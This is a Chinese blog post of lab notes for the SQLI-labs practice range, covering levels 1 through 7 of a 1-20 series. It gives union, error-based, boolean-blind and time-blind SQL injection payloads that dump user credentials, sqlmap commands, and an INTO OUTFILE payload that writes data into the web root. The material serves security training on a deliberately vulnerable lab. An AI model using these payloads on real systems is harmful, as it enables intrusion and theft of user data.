<!DOCTYPE html><html lang="zh-CN" data-default-color-scheme="&#34;auto&#34;"><head><meta charset="UTF-8"><link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png"><link rel="icon" type="image/png" href="/img/favicon.png"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,shrink-to-fit=no"><meta http-equiv="x-ua-compatible" content="ie=edge"><meta name="theme-color" content="#2f4154"><meta name="description" content="没有天生的大牛，更没有永远的菜鸟求知若饥 , 虚心若愚"><meta name="author" content="iceH"><meta name="keywords" content=""><title>SQLI labs 靶场笔记之基础挑战 1-20 关 - iceH’s Blog</title><link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css"><link rel="stylesheet" href="/lib/hint/hint.min.css"><link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css"><link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/css/gundongtiao.css#%20%E6%BB%9A%E5%8A%A8%E6%9D%A1%E9%A2%9C%E8%89%B2.css"><link rel="stylesheet" href="/css/shubiao.css#%20%E9%BC%A0%E6%A0%87%E6%8C%87%E9%92%88.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><link rel="stylesheet" href="/css/valine.css"><script id="fluid-configs">var Fluid=window.Fluid||{},CONFIG={hostname:"www.secice.cn",root:"/",version:"1.8.5",typing:{enable:!0,typeSpeed:70,cursorChar:"_",loop:!1},toc:{enable:!0,headingSelector:"h1,h2,h3,h4,h5,h6",collapseDepth:0},anchorjs:{enable:!0,element:"h1,h2,h3,h4,h5,h6",placement:"right",visible:"hover",icon:""},copy_btn:!0,image_zoom:{enable:!0},lazyload:{enable:!0,onlypost:!1},web_analytics:{enable:!1,baidu:null,google:null,gtag:null,tencent:{sid:null,cid:null},woyaola:null,cnzz:null,leancloud:{app_id:null,app_key:null,server_url:null}}}</script><script src="/js/utils.js"></script><script src="/js/color-schema.js"></script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="iceH’s Blog" type="application/atom+xml">
</head><body><header style="height:70vh"><nav id="navbar" class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"><div class="container"><a class="navbar-brand" href="/">&nbsp;<strong>iceH's Blog</strong>&nbsp;</a> <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><div class="animated-icon"><span></span><span></span><span></span></div></button><div class="collapse navbar-collapse" id="navbarSupportedContent"><ul class="navbar-nav ml-auto text-center"><li class="nav-item"><a class="nav-link" href="/"><i class="iconfont icon-home-fill"></i> 首页</a></li><li class="nav-item dropdown"><a class="nav-link dropdown-toggle" href="#" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"><i class="iconfont icon-books"></i> 博文</a><div class="dropdown-menu" aria-labelledby="navbarDropdown"><a class="dropdown-item" href="/archives/"><i class="iconfont icon-archive-fill"></i> 归档 </a><a class="dropdown-item" href="/categories/"><i class="iconfont icon-category-fill"></i> 分类 </a><a class="dropdown-item" href="/tags/"><i class="iconfont icon-tags-fill"></i> 标签</a></div></li><li class="nav-item"><a class="nav-link" href="/playlist/"><i class="iconfont icon-music"></i> 音乐</a></li><li class="nav-item"><a class="nav-link" href="/about/"><i class="iconfont icon-user-fill"></i> 关于</a></li><li class="nav-item"><a class="nav-link" href="/links/"><i class="iconfont icon-link-fill"></i> 友链</a></li><li class="nav-item" id="search-btn"><a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a></li><li class="nav-item" id="color-toggle-btn"><a class="nav-link" href="javascript:">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a></li></ul></div></div></nav><div class="banner intro-2" id="background" parallax="true" style="background:url(/img/background1.jpg) no-repeat center center;background-size:cover"><div class="full-bg-img"><div class="mask flex-center" style="background-color:rgba(0,0,0,.3)"><div class="page-header text-center fade-in-up"><span class="h2" id="subtitle" title="SQLI labs 靶场笔记之基础挑战 1-20 关"></span><div class="mt-3"><span class="post-meta"><i class="iconfont icon-date-fill" aria-hidden="true"></i> <time datetime="2020-07-20 10:00" pubdate>2020年7月20日 上午</time></span></div><div class="mt-1"><span class="post-meta mr-2"><i class="iconfont icon-chart"></i> 4.9k 字 </span><span class="post-meta mr-2"><i class="iconfont icon-clock-fill"></i> 74 分钟</span></div></div></div></div></div></header><main><div class="container-fluid"><div class="row"><div class="d-none d-lg-block col-lg-2"></div><div class="col-lg-8 nopadding-md"><div class="container nopadding-md" id="board-ctn"><div class="py-5" id="board"><article class="post-content mx-auto"><h1 style="display:none">SQLI labs 靶场笔记之基础挑战 1-20 关</h1><div class="markdown-body"><h1 id="常见注入流程"><a href="#常见注入流程" class="headerlink" title="常见注入流程"></a>常见注入流程</h1><h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><pre><code class="hljs sql">?id=1&#x27;
?id=1&#x27; order by 3 <span class="hljs-comment">--+</span>
?id=1&#x27; order by 4 <span class="hljs-comment">--+</span>
?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-keyword">version</span>() <span class="hljs-comment">--+</span>
?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,database(),version() --+</span>
<span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-number">0x7365637572697479</span> <span class="hljs-comment">--+</span>
?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+</span>
<span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>+SEPARATOR+<span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+</span></code></pre><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>手动修改 <code>LIMIT 0,1</code> 来进行结果偏移</p><pre><code class="hljs sql">?id=1&#x27; and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span>
?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span>
<span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+ </span>
?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema = &#x27;</span><span class="hljs-keyword">security</span><span class="hljs-string">&#x27; limit 3,1),0x7e),1)--+ </span>
<span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> table_name = <span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span>
?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)--+</span>
<span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span>
?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1)--+</span>
<span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span></code></pre><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>数据库第一个字母为 <code>s</code></p><pre><code class="hljs sql">?id=1&#x27; and left(database(),1)&gt;&#x27;r&#x27;--+
?id=1&#x27; and left(database(),1)&gt;&#x27;s&#x27;--+
?id=1&#x27; and left(database(),2)&gt;&#x27;sd&#x27;--+
?id=1&#x27; and left(database(),2)&gt;&#x27;se&#x27;--+
...</code></pre><h2 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h2><p>数据库第一个字母的 ascii 码为 115，即<code>s</code></p><p>利用<code>if(条件,0,1)</code>函数，当条件为真，返回0，假则返回1</p><pre><code class="hljs sql">?id=1&#x27; and if(ascii(substr(database(),1,1))&gt;114,1,sleep(5))--+
?id=1&#x27; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+
?id=1&#x27; and if(ascii(substr(database(),2,1))&gt;100,1,sleep(5))--+
?id=1&#x27; and if(ascii(substr(database(),2,1))&gt;101,1,sleep(5))--+
...</code></pre><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p><strong>联合查询注入</strong></p><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://sqli.pl/Less-1/?id=1&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=U -v 3</code></pre><p><strong>报错注入</strong></p><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://sqli.pl/Less-1/?id=1&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=E -v 3</code></pre><p><strong>布尔盲注</strong></p><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://sqli.pl/Less-1/?id=1&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=B -v 3</code></pre><p><strong>延时盲注</strong></p><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://sqli.pl/Less-1/?id=1&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=T -v 3</code></pre><h1 id="基础挑战-1-20-关"><a href="#基础挑战-1-20-关" class="headerlink" title="基础挑战 1-20 关"></a>基础挑战 1-20 关</h1><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><pre><code class="hljs php"><span class="hljs-comment"># 单引号拼接</span>
<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;

<span class="hljs-comment"># 支持联合、报错、布尔盲注、延时盲注</span>
<span class="hljs-keyword">if</span> <span class="hljs-literal">true</span>:
    输出查询内容
<span class="hljs-keyword">else</span>:
    print_r(mysql_error());</code></pre><h3 id="联合查询注入-1"><a href="#联合查询注入-1" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><pre><code class="hljs sql">?id=1&#x27;
?id=1&#x27; order by 3 <span class="hljs-comment">--+</span>
?id=1&#x27; order by 4 <span class="hljs-comment">--+</span>
?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-keyword">version</span>() <span class="hljs-comment">--+</span>
?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,database(),version() --+</span>
<span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-number">0x7365637572697479</span> <span class="hljs-comment">--+</span>
?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+</span>
<span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>+SEPARATOR+<span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+</span></code></pre><h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=$id</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=<span class="hljs-subst">$id</span> LIMIT 0,1&quot;</span>;</code></pre><p>和 Less-1 利用方式一致，只是闭合方式不一样而已</p><pre><code class="hljs sql">?id=1
?id=1 order by 3 <span class="hljs-comment">--+</span>
?id=1 order by 4 <span class="hljs-comment">--+</span>
?id=-1 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-keyword">version</span>() <span class="hljs-comment">--+</span>
?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>(),<span class="hljs-keyword">version</span>() <span class="hljs-comment">--+</span>
?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-number">0x7365637572697479</span> <span class="hljs-comment">--+</span>
?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-number">0x7573657273</span> <span class="hljs-comment">--+</span>
?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>+SEPARATOR+<span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+</span></code></pre><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="hljs-subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</code></pre><p>和 Less-1 利用方式一致，只是闭合方式不一样而已。</p><pre><code class="hljs sql">?id=1&#x27;)
?id=1&#x27;) order by 3 <span class="hljs-comment">--+</span>
?id=1&#x27;) order by 4 <span class="hljs-comment">--+</span>
?id=-1&#x27;) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-keyword">version</span>() <span class="hljs-comment">--+</span>
?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span><span class="hljs-string">&#x27;) union select 1,database(),version() --+</span>
<span class="hljs-string">?id=-1&#x27;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-number">0x7365637572697479</span> <span class="hljs-comment">--+</span>
?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span><span class="hljs-string">&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+</span>
<span class="hljs-string">?id=-1&#x27;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>+SEPARATOR+<span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+</span></code></pre><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=(&quot;$id&quot;)</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><pre><code class="hljs Php"><span class="hljs-comment"># 先双引号 在括号拼接</span>
<span class="hljs-variable">$id</span> = <span class="hljs-string">&#x27;&quot;&#x27;</span> . <span class="hljs-variable">$id</span> . <span class="hljs-string">&#x27;&quot;&#x27;</span>;
<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=(<span class="hljs-subst">$id</span>) LIMIT 0,1&quot;</span>;

<span class="hljs-comment"># 支持联合、报错、布尔盲注、延时盲注</span>
<span class="hljs-keyword">if</span> <span class="hljs-literal">true</span>:
    输出查询内容
<span class="hljs-keyword">else</span>:
    print_r(mysql_error());</code></pre><pre><code class="hljs sql">?id=1&quot;)
?id=1&quot;) order by 3 <span class="hljs-comment">--+</span>
?id=1&quot;) order by 4 <span class="hljs-comment">--+</span>
?id=-1&quot;) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-keyword">version</span>() <span class="hljs-comment">--+</span>
?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span><span class="hljs-string">&quot;) union select 1,database(),version() --+</span>
<span class="hljs-string">?id=-1&quot;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-number">0x7365637572697479</span> <span class="hljs-comment">--+</span>
?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span><span class="hljs-string">&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+</span>
<span class="hljs-string">?id=-1&quot;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>+SEPARATOR+<span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+</span></code></pre><h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><pre><code class="hljs php"><span class="hljs-comment"># 直接单引号拼接</span>
<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;

<span class="hljs-comment"># 支持报错、布尔盲注、延时盲注</span>
<span class="hljs-keyword">if</span> <span class="hljs-literal">true</span>:
    输出 You are in...........
<span class="hljs-keyword">else</span>:
    print_r(mysql_error());</code></pre><p>因为不输出查询的结果，这就导致不可以使用联合查询的注入方式，但是并不影响正常使用报错、布尔盲注和延时盲注，除了不能联合查询注入，其他和 Less-1 利用方式一致。</p><pre><code class="hljs sql">?id=1&#x27; and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span>
?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span>
<span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+ </span>
?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema = &#x27;</span><span class="hljs-keyword">security</span><span class="hljs-string">&#x27; limit 3,1),0x7e),1)--+ </span>
<span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> table_name = <span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span>
?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)--+</span>
<span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span>
?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1)--+</span>
<span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span></code></pre><h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>id=&quot;$id&quot;</code></td></tr></tbody></table><p>和 Less-5 利用方式一致，只是闭合方式不一样，这里不再啰嗦了。</p><h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>id=((&#39;$id&#39;))</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><pre><code class="hljs Php"><span class="hljs-comment"># 使用单引号加双层括号拼接</span>
<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=((&#x27;<span class="hljs-subst">$id</span>&#x27;)) LIMIT 0,1&quot;</span>;

<span class="hljs-comment"># 支持布尔盲注、延时盲注</span>
<span class="hljs-keyword">if</span> <span class="hljs-literal">true</span>:
    输出 You are in.... <span class="hljs-keyword">Use</span> <span class="hljs-title">outfile</span>......
<span class="hljs-title">else</span>:
    输出 <span class="hljs-title">You</span> <span class="hljs-title">have</span> <span class="hljs-title">an</span> <span class="hljs-title">error</span> <span class="hljs-title">in</span> <span class="hljs-title">your</span> <span class="hljs-title">SQL</span> <span class="hljs-title">syntax</span>
  //<span class="hljs-title">print_r</span>(<span class="hljs-title">mysql_error</span>());</code></pre><p>因为这里把<code>print_r(mysql_error());</code>给注释掉了，所以就不可以使用报错注入了，这个时候只能使用布尔盲注和延时盲注，可以尝试手工验证一下然后放到 sqlmap 里面来跑。</p><p>因为这一关作者很明显地提示了如下信息：</p><pre><code class="hljs lasso">You are <span class="hljs-keyword">in</span><span class="hljs-params">...</span>. Use outfile<span class="hljs-params">...</span><span class="hljs-params">...</span></code></pre><p>所以我们就来配合一下作者，使用 outfile 导出到文件来查询数据，默认 outfile 是没有开启的，得手动开启一下</p><pre><code class="hljs Bash">mysql&gt; show global variables like <span class="hljs-string">&#x27;%secure%&#x27;</span>;
+--------------------------+-------+
| Variable_name            | Value |
+--------------------------+-------+
| require_secure_transport | OFF   |
| secure_file_priv         | NULL  |
+--------------------------+-------+
2 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span>, 1 warning (0.02 sec)</code></pre><ul><li>secure_file_priv的值为 <code>null</code> ，表示限制 mysqld 不允许导入|导出</li><li>当secure_file_priv 的值为 <code>/tmp/</code> ，表示限制 mysqld 的导入|导出只能发生在/tmp/目录下</li><li>当secure_file_priv 的值为 <code>空</code> 时，表示不对 mysqld 的导入|导出做限制</li></ul><p><code>在mysql.ini里添加&quot;secure_file_priv=&#39;&#39;，保存，重启mysql</code></p><p>一般我们将这个信息导出到网站的根目录下，所以需要知道网站的物理路径信息，因为这里是靶机，所有这里就直接导出到网站根目录下看看：</p><pre><code class="hljs sql">?id=1&#x27;)) union <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> security.users <span class="hljs-keyword">into</span> <span class="hljs-keyword">outfile</span> <span class="hljs-string">&quot;D:/phpstudy_pro/WWW/sqli.pl/Less-7/users.txt&quot;</span><span class="hljs-comment">--+ </span></code></pre><p>users.txt内容</p><pre><code class="hljs apache"><span class="hljs-attribute">1</span>	Dumb	Dumb
<span class="hljs-attribute">2</span>	Angelina	I-kill-you
